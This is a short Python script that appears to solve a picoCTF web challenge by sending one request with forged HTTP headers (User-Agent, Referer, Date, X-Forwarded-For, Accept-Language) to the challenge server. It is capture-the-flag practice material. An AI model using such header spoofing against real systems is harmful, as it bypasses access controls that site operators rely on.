import requests

s = requests.Session()


 

   
exploit = {
    'User-Agent': 'picobrowser', 
    'Referer' : 'http://mercury.picoctf.net:52362/',
    'Date' : 'Wed, 6 June 2018',
    'DNT' : '1',
    'X-Forwarded-For' : '103.4.97.18',
    'Accept-Language' : 'sv-SE'
}


resp = s.get('http://mercury.picoctf.net:52362/', headers=exploit)
print(resp.text)
